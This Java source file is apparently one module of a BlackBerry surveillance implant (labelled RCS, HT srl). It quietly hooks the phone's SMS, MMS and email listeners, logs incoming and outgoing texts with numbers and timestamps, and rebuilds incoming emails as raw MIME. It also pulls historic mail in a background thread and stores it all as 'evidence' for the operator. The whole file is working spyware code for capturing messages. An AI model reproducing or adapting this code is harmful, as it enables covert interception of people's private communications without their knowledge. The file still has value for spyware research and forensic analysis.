//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : MessageAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.module;

import java.util.Date;
import java.util.Enumeration;
import java.util.Vector;

import net.rim.blackberry.api.mail.Address;
import net.rim.blackberry.api.mail.Header;
import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.phone.Phone;
import net.rim.device.api.util.DataBuffer;
import blackberry.Messages;
import blackberry.config.ChildConf;
import blackberry.config.ConfModule;
import blackberry.config.ConfigurationException;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.evidence.TimestampMarkup;
import blackberry.interfaces.MailObserver;
import blackberry.interfaces.MmsObserver;
import blackberry.interfaces.SmsObserver;
import blackberry.manager.ModuleManager;
import blackberry.module.mail.Filter;
import blackberry.module.mail.Mail;
import blackberry.module.mail.MailListener;
import blackberry.module.mail.MailParser;
import blackberry.module.mail.Prefix;
import blackberry.module.mms.MmsListener;
import blackberry.module.sms.SmsListener;
import blackberry.module.sms.SmsListener45;
import blackberry.module.sms.SmsListener46;
import blackberry.utils.DateTime;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

/**
 * The Class MessageAgent.
 */
public final class ModuleMessage extends BaseModule implements SmsObserver,
        MmsObserver, MailObserver {

    //#ifdef DEBUG
    static Debug debug = new Debug("ModMessage", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    private static final int SMS_VERSION = 2010050501;
    private static final int MAIL_VERSION = 2009070301;

    protected static final int SLEEPTIME = 5000;
    protected static final int PERIODTIME = 60 * 60 * 1000;

    boolean mailEnabled;
    boolean smsEnabled;
    boolean mmsEnabled;

    MailListener mailListener;
    SmsListener smsListener;
    MmsListener mmsListener;

    TimestampMarkup markupDate;
    //public Date lastcheck = new Date(0);

    protected String identification;
    //public IntHashtable filtersSMS = new IntHashtable();
    //public IntHashtable filtersMMS = new IntHashtable();
    Filter filterEmailCollect;
    Filter filterEmailRuntime;

    //boolean firstRun;
    Thread historyThread = null;
    private boolean mailHistory;

    private Date mailFrom;
    private Date mailTo;

    public static String getStaticType() {
        return Messages.getString("18.0"); //$NON-NLS-1$
    }

    public static ModuleMessage getInstance() {
        return (ModuleMessage) ModuleManager.getInstance().get(getStaticType());
    }

    /**
     * Instantiates a new message agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public ModuleMessage() {

        markupDate = new TimestampMarkup(getStaticType());

        setDelay(SLEEPTIME);
        setPeriod(PERIODTIME);

        mailListener = MailListener.getInstance();

        //#ifdef SMS_HIDE
        smsListener = SmsListener46.getInstance();
        mmsListener = MmsListener.getInstance();
        //#else
        smsListener = SmsListener45.getInstance();
        //#endif
        //smsListener.setMessageAgent(this);

        
    }

    public boolean parse(ConfModule conf) {
        setPeriod(NEVER);
        setDelay(100);

        try {
            ChildConf mailJson = conf.getChild(Messages.getString("18.1")); //$NON-NLS-1$
            mailEnabled = mailJson.getBoolean(Messages.getString("18.2")); //$NON-NLS-1$
            ChildConf mailFilter = mailJson
                    .getChild(Messages.getString("18.3")); //$NON-NLS-1$
            mailHistory = mailFilter.getBoolean(Messages.getString("18.4")); //$NON-NLS-1$
            mailFrom = mailFilter.getDate(Messages.getString("18.5")); //$NON-NLS-1$
            mailTo = mailFilter.getDate(Messages.getString("18.6")); //$NON-NLS-1$

            int maxSizeToLog = 4096;
            filterEmailCollect = new Filter(mailHistory, mailFrom, mailTo,
                    maxSizeToLog, maxSizeToLog);
            filterEmailRuntime = new Filter(mailEnabled, maxSizeToLog);

            ChildConf smsJson = conf.getChild(Messages.getString("18.7")); //$NON-NLS-1$
            smsEnabled = smsJson.getBoolean(Messages.getString("18.8")); //$NON-NLS-1$

            ChildConf mmsJson = conf.getChild(Messages.getString("18.9")); //$NON-NLS-1$
            mmsEnabled = mmsJson.getBoolean(Messages.getString("18.10")); //$NON-NLS-1$
        } catch (ConfigurationException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("parse"); //$NON-NLS-1$
            //#endif
            return false;
        }

        return true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    public void actualStart() {

        if (smsEnabled) {
            smsListener.addSmsObserver(this, null, null);
        }

        if (mmsEnabled) {
            mmsListener.start(this);
        }

        if (mailEnabled) {
            mailListener.addSingleMailObserver(this);

            if (status.firstMessageRun) {
                //#ifdef DEBUG
                debug.info("First Run"); //$NON-NLS-1$
                //#endif
                status.firstMessageRun = false;

                if (mailEnabled) {
                    if (historyThread != null) {
                        //#ifdef DEBUG
                        debug.trace("actualRun: stopping historyThread"); //$NON-NLS-1$
                        //#endif

                        //#ifdef HISTORY_MAIL
                        mailListener.stopHistory();
                        //#endif

                        try {
                            historyThread.join();
                            //#ifdef DEBUG
                            debug.trace("actualRun: joined"); //$NON-NLS-1$
                            //#endif
                        } catch (Exception e) {
                            //#ifdef DEBUG
                            debug.error("actualRun: " + e); //$NON-NLS-1$
                            //#endif
                        }
                    }
                    historyThread = new Thread(new Runnable() {
                        public void run() {
                            mailListener.retrieveHistoricMails();
                        }
                    });
                    historyThread.start();
                }
            }
        }
        status.firstMessageRun = true;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualLoop() {

        // Ogni ora viene verificato se i nomi degli account corrisponde
        // se non corrisponde, restart dell'agente.

        if (mailEnabled && haveNewAccount()) {
            //#ifdef DEBUG
            debug.info("Restarting MessageAgent, new account"); //$NON-NLS-1$
            //#endif
            ModuleManager.getInstance().reStart(getStaticType()); //$NON-NLS-1$
        }

    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    public void actualStop() {
        if (smsEnabled && smsListener!=null) {
            smsListener.removeSmsObserver(this);
        }

        if (mmsEnabled && mmsListener!=null) {
            mmsListener.stop();
        }

        if (mailEnabled && mailListener!=null) {
            mailListener.removeSingleMailObserver(this);
        }
    }

    private boolean haveNewAccount() {
        return mailListener.haveNewAccount();
    }

    /**
     * Creates the log.
     * 
     * @param additionalData
     *            the additional data
     * @param content
     *            the content
     * @param logType
     */
    public void createEvidence(final byte[] additionalData,
            final byte[] content, final int logType) {

        Evidence evidence = new Evidence(logType);
        //#ifdef DBC
        Check.requires(content != null, "createEvidence content null"); //$NON-NLS-1$
        Check.requires(evidence != null, "log null"); //$NON-NLS-1$
        //#endif

        evidence.atomicWriteOnce(additionalData, content);

        //#ifdef DEBUG
        debug.trace("Evidence created"); //$NON-NLS-1$
        //#endif
    }

    private Vector tokenize(final byte[] conf) {
        final Vector tokens = new Vector();
        int offset = 0;
        final int length = conf.length;

        while (offset < length) {
            final Prefix token = new Prefix(conf, offset);
            if (!token.isValid()) {
                return null;
            } else {
                tokens.addElement(token);
                offset += token.length + 4;
            }
        }

        return tokens;
    }

    public synchronized void lastcheckSet(String key, Date date) {
        //#ifdef DEBUG
        debug.trace("Writing markup: " + key + " date: " + date); //$NON-NLS-1$ //$NON-NLS-2$
        //#endif

        final ModuleMessage agent = (ModuleMessage) ModuleMessage.getInstance();

        if (agent != null) {
            agent.markupDate.put(key, date);
        } else {
            markupDate.put(key, date);
        }

    }

    public synchronized Date lastcheckGet(String key) {

        //#ifdef DBC
        Check.requires(markupDate != null, "lastcheckGet markupDate==null"); //$NON-NLS-1$
        //#endif

        Date date = markupDate.get(key);

        //#ifdef DEBUG
        debug.trace("getLastCheck: " + key + " = " + date); //$NON-NLS-1$ //$NON-NLS-2$
        //#endif

        if (date == null) {
            date = new Date(0);
            markupDate.put(key, date);
        }
        return date;
    }

    public synchronized void lastcheckReset() {
        //#ifdef DEBUG
        debug.trace("lastcheckReset markupDate: " + markupDate); //$NON-NLS-1$
        //#endif

        markupDate.removeMarkup();

        //lastcheck = new Date(0); 
    }

    public boolean onNewSms(final byte[] byteMessage, String address,
            final boolean incoming) {

        String message = new String(byteMessage);
        //#ifdef DBC
        Check.requires(message != null, "saveLog: null message"); //$NON-NLS-1$
        //#endif

        //#ifdef DEBUG
        debug.trace("saveLog message: " + message + " address: " + address //$NON-NLS-1$ //$NON-NLS-2$
                + " incoming: " + incoming); //$NON-NLS-1$
        //#endif

        //final byte[] dataMsg = getSmsDataMessage(message);
        //#ifdef DBC
        Check.asserts(message != null, "saveLog: null dataMsg"); //$NON-NLS-1$
        //#endif

        //final ByteArrayOutputStream os = null;
        try {
            final int flags = incoming ? 1 : 0;

            DateTime filetime = null;
            final int additionalDataLen = 48;
            final byte[] additionalData = new byte[additionalDataLen];

            String from;
            String to;

            // Check if it's actually a sms

            final String prefix = "//"; //$NON-NLS-1$
            int pos = address.indexOf(prefix);
            if (pos >= 0) {
                address = address.substring(prefix.length() + pos);
            } else {
                //#ifdef DEBUG
                debug.error("Not a sms"); //$NON-NLS-1$
                //#endif
                return false;
            }

            // Filling fields
            final Date date = new Date();

            if (incoming) {
                from = address;
                to = getMySmsAddress();

            } else {
                from = getMySmsAddress();
                to = address;
            }

            filetime = new DateTime(date);

            //#ifdef DBC
            Check.asserts(filetime != null, "saveLog: null filetime"); //$NON-NLS-1$
            //#endif

            // preparing additionalData

            final DataBuffer databuffer = new DataBuffer(additionalData, 0,
                    additionalDataLen, false);
            databuffer.writeInt(SMS_VERSION);
            databuffer.writeInt(flags);
            databuffer.writeLong(filetime.getFiledate());
            databuffer.write(Utils.padByteArray(from.getBytes(), 16));
            databuffer.write(Utils.padByteArray(to.getBytes(), 16));

            //#ifdef DEBUG
            debug.info("sms : " + (incoming ? "incoming" : "outgoing")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
            debug.info("From: " + from + " To: " + to + " date: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
                    + filetime.toString());
            //#endif

            //#ifdef DBC
            Check.ensures(databuffer.getLength() == additionalDataLen,
                    "SMS Wrong databuffer size: " + databuffer.getLength()); //$NON-NLS-1$
            Check.ensures(additionalData.length == additionalDataLen,
                    "SMS Wrong buffer size: " + additionalData.length); //$NON-NLS-1$
            //#endif

            // Creating log
            if (message != null) {
                createEvidence(additionalData, WChar.getBytes(message),
                        EvidenceType.SMS_NEW);
                return false;
            } else {
                //#ifdef DEBUG
                debug.error("data null"); //$NON-NLS-1$
                //#endif
                return false;
            }

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("saveLog message: " + ex); //$NON-NLS-1$
            //#endif
            return false;
        }
    }

    public void onNewMms(final byte[] byteMessage, String address,
            final boolean incomin) {
        
    }

    private String getMySmsAddress() {
        final String number = Phone.getDevicePhoneNumber(false);
        if (number == null || number.startsWith(Messages.getString("18.11"))) { //$NON-NLS-1$
            return Messages.getString("18.12"); //$NON-NLS-1$
        }

        //#ifdef DBC
        Check.ensures(number.length() <= 16, "getMyAddress too long: " + number); //$NON-NLS-1$
        //#endif

        return number;
    }

    public void onNewMail(final Message message, final int maxMessageSize,
            final String storeName) {

        //#ifdef DBC
        Check.requires(message != null, "message != null"); //$NON-NLS-1$
        Check.requires(storeName != null, "storeName != null"); //$NON-NLS-1$
        //#endif

        //#ifdef DEBUG
        debug.trace("saveEvidence: " + message + " name: " + storeName); //$NON-NLS-1$ //$NON-NLS-2$
        //#endif

        try {

            final int flags = 1;

            String from = Messages.getString("18.13"); //$NON-NLS-1$
            if (storeName.indexOf("@") > 0) { //$NON-NLS-1$
                from = storeName;
            }
            final String mail = makeMimeMessage(message, maxMessageSize, from);
            //#ifdef DBC
            Check.asserts(mail != null, "Null mail"); //$NON-NLS-1$
            //#endif

            int size = message.getSize();
            if (size == -1) {
                size = mail.length();
            }

            final DateTime filetime = new DateTime(message.getReceivedDate());

            final byte[] additionalData = new byte[20];

            final DataBuffer databuffer = new DataBuffer(additionalData, 0, 20,
                    false);
            databuffer.writeInt(MAIL_VERSION);
            databuffer.writeInt(flags);
            databuffer.writeInt(size);
            databuffer.writeLong(filetime.getFiledate());
            //#ifdef DBC
            Check.asserts(additionalData.length == 20,
                    "Mail Wrong buffer size: " + additionalData.length); //$NON-NLS-1$
            //#endif

            //#ifdef DEBUG
            debug.trace("saveEvidence: " //$NON-NLS-1$
                    + mail.substring(0, Math.min(mail.length(), 200)));
            //#endif

            createEvidence(additionalData, mail.getBytes("UTF-8"), //$NON-NLS-1$
                    EvidenceType.MAIL_RAW);

            //messageAgent.createLog(additionalData, mail.getBytes("ISO-8859-1"),
            //      LogType.MAIL_RAW);

        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("saveEvidence message: " + ex); //$NON-NLS-1$
            //#endif

        }

    }

    private String makeMimeMessage(final Message message,
            final int maxMessageSize, final String from) {
        final Address[] addresses;

        final StringBuffer mailRaw = new StringBuffer();

        // costruisce gli header
        addAllHeaders(message.getAllHeaders(), mailRaw);
        addFromHeaders(message.getAllHeaders(), mailRaw, from);

        // decode del mime, separo text da html
        final MailParser parser = new MailParser(message);
        final Mail mail = parser.parse();

        //#ifdef DEBUG
        debug.trace("Email size: " + message.getSize() + " bytes"); //$NON-NLS-1$ //$NON-NLS-2$
        debug.trace("Sent date: " + message.getSentDate()); //$NON-NLS-1$
        debug.trace("Subject: " + message.getSubject()); //$NON-NLS-1$
        //debug.trace("Body text: " + message.getBodyText());
        //#endif

        // comincia la ricostruzione del MIME
        mailRaw.append(Messages.getString("18.14")); //$NON-NLS-1$
        final long rnd = Math.abs(Utils.randomLong());
        final String boundary = Messages.getString("18.15") + rnd; //$NON-NLS-1$

        if (mail.isMultipart()) {
            mailRaw.append(Messages.getString("18.16") //$NON-NLS-1$
                    + boundary + "\r\n"); //$NON-NLS-1$
            mailRaw.append("\r\n--" + boundary + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
        }

        if (mail.hasText()) {
            mailRaw.append(mail.plainTextMessageContentType);
            String msg = mail.plainTextMessage;
            if (maxMessageSize > 0 && msg.length() > maxMessageSize) {
                msg = msg.substring(0, maxMessageSize);
            }
            mailRaw.append(msg);
        }

        if (mail.isMultipart()) {
            mailRaw.append("\r\n--" + boundary + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
        }

        if (mail.hasHtml()) {
            //mailRaw.append("Content-Transfer-Encoding: quoted-printable\r\n");
            //mailRaw.append("Content-type: text/html; charset=UTF8\r\n\r\n");
            mailRaw.append(mail.htmlMessageContentType);
            mailRaw.append(mail.htmlMessage);
        }

        if (mail.isMultipart()) {
            mailRaw.append("\r\n--" + boundary + "--\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
        }

        // se il mio parser fallisce, uso la decodifica di base fornita dalla classe Message
        if (mail.isEmpty()) {
            mailRaw.append(Messages.getString("18.17")); //$NON-NLS-1$

            String msg = message.getBodyText();
            if (maxMessageSize > 0 && msg.length() > maxMessageSize) {
                msg = msg.substring(0, maxMessageSize);
            }
            mailRaw.append(msg);
        }

        mailRaw.append("\r\n"); //$NON-NLS-1$

        final String craftedMail = mailRaw.toString();

        return craftedMail;
    }

    /**
     * Aggiunge alla mail "raw" generata la lista di header presenti nel Message
     * originale
     * 
     * @param headers
     * @param mail
     */
    private void addAllHeaders(final Enumeration headers,
            final StringBuffer mail) {

        while (headers.hasMoreElements()) {
            final Object headerObj = headers.nextElement();
            if (headerObj instanceof Header) {
                final Header header = (Header) headerObj;
                mail.append(header.getName());
                mail.append(header.getValue());
                mail.append("\r\n"); //$NON-NLS-1$
            } else {
                //#ifdef DEBUG
                debug.error("Unknown header type: " + headerObj); //$NON-NLS-1$
                //#endif
            }
        }
    }

    /**
     * Il metodo addAllHeaders non estrae il campo from. Occorre specificarglelo
     * esplicitamente.
     * 
     * @param headers
     * @param mail
     * @param from
     */
    private void addFromHeaders(final Enumeration headers,
            final StringBuffer mail, final String from) {

        boolean fromFound = false;
        while (headers.hasMoreElements()) {
            final Object headerObj = headers.nextElement();
            if (headerObj instanceof Header) {
                final Header header = (Header) headerObj;
                if (header.getName().startsWith(Messages.getString("18.18"))) { //$NON-NLS-1$
                    fromFound = true;
                }
            }
        }
        if (!fromFound) {
            //#ifdef DEBUG
            debug.info("Adding from: " + from); //$NON-NLS-1$
            //#endif
            mail.append(Messages.getString("18.19") + from + "\r\n"); //$NON-NLS-1$ //$NON-NLS-2$
        }
    }

    public Filter getFilterEmailRealtime() {
        return filterEmailRuntime;
    }

    public Filter getFilterEmailCollect() {
        return filterEmailCollect;
    }

}
